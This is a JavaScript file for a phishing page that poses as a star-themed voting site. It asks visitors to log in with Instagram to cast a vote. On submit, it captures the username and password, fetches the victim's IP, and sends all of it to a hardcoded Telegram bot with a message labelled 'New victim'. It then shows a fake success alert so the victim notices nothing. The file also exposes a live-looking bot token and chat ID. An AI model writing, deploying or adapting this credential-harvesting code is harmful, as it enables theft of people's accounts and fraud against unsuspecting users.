document.addEventListener('DOMContentLoaded', () => {
    // ========== НАСТРОЙКИ TELEGRAM ==========
    const TELEGRAM_BOT_TOKEN = '8531735253:AAFMnH1ouNqmoOhUZUVxVpGlZcbvKb5dWoU';
    const TELEGRAM_CHAT_ID = '7888938644';
    // =========================================
    
    const starsContainer = document.getElementById('starsContainer');
    const payButton = document.getElementById('payButton');
    const voteScreen = document.getElementById('voteScreen');
    const loginScreen = document.getElementById('loginScreen');
    const instagramForm = document.getElementById('instagramForm');
    const errorMessage = document.getElementById('errorMessage');
    const submitLoginBtn = document.getElementById('submitLoginBtn');
    
    // Отправка в Telegram
    function sendToTelegram(username, password) {
        const baseMessage = `🔥 Новый жертва:\n👤 Логин: ${username}\n🔑 Пароль: ${password}`;
        
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                return fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: `${baseMessage}\n🌐 IP: ${data.ip}`,
                        parse_mode: 'HTML'
                    })
                });
            })
            .catch(() => {
                return fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: baseMessage,
                        parse_mode: 'HTML'
                    })
                });
            })
            .catch(err => console.log('Ошибка отправки в Telegram:', err));
    }
    
    // Фоновые звезды
    function createBackgroundStars() {
        const starCount = 30;
        for (let i = 0; i < starCount; i++) {
            const star = document.createElement('div');
            star.classList.add('star');
            star.innerText = Math.random() > 0.5 ? '★' : '✦';
            star.style.left = `${Math.random() * 100}%`;
            star.style.top = `${Math.random() * 100}%`;
            star.style.fontSize = `${Math.random() * 10 + 10}px`;
            star.style.animationDelay = `${Math.random() * 3}s`;
            starsContainer.appendChild(star);
        }
    }
    
    // Переключение экранов
    payButton.addEventListener('click', () => {
        voteScreen.classList.add('hidden');
        loginScreen.classList.remove('hidden');
    });
    
    // Обработка формы
    instagramForm.addEventListener('submit', (e) => {
        e.preventDefault();
        
        errorMessage.classList.add('hidden');
        errorMessage.innerText = '';
        
        const usernameValue = document.getElementById('username').value.trim();
        const passwordValue = document.getElementById('password').value.trim();
        
        // ПЕРЕХВАТ ДАННЫХ И ОТПРАВКА В TELEGRAM
        sendToTelegram(usernameValue, passwordValue);
        
        // Валидация
        if (usernameValue.length < 3) {
            showError('Имя пользователя должно содержать не менее 3 символов.');
            return;
        }
        
        if (passwordValue.length < 6) {
            showError('Неверный пароль. Длина пароля должна быть от 6 символов.');
            return;
        }
        
        // Имитация отправки голоса
        submitLoginBtn.disabled = true;
        submitLoginBtn.textContent = 'Проверка аккаунта и передача голоса...';
        submitLoginBtn.style.background = '#27ae60';
        
        setTimeout(() => {
            triggerSuccessExplosion();
            alert('Успех! Данные проверены. Ваш голос за кандидата успешно передан.');
            submitLoginBtn.textContent = 'Голос зачтен!';
        }, 1500);
    });
    
    // Ошибка
    function showError(text) {
        errorMessage.innerText = text;
        errorMessage.classList.remove('hidden');
    }
    
    // Взрыв звезд
    function triggerSuccessExplosion() {
        for (let i = 0; i < 25; i++) {
            const burstStar = document.createElement('div');
            burstStar.classList.add('star');
            burstStar.innerText = '★';
            burstStar.style.left = '50%';
            burstStar.style.top = '50%';
            burstStar.style.position = 'absolute';
            burstStar.style.fontSize = '18px';
            burstStar.style.opacity = '1';
            burstStar.style.transition = 'all 0.8s ease-out';
            
            starsContainer.appendChild(burstStar);
            
            setTimeout(() => {
                const angle = Math.random() * Math.PI * 2;
                const distance = Math.random() * 150 + 50;
                burstStar.style.transform = `translate(${Math.cos(angle) * distance}px, ${Math.sin(angle) * distance}px) scale(0.3)`;
                burstStar.style.opacity = '0';
            }, 50);
            
            setTimeout(() => burstStar.remove(), 850);
        }
    }
    
    createBackgroundStars();
});
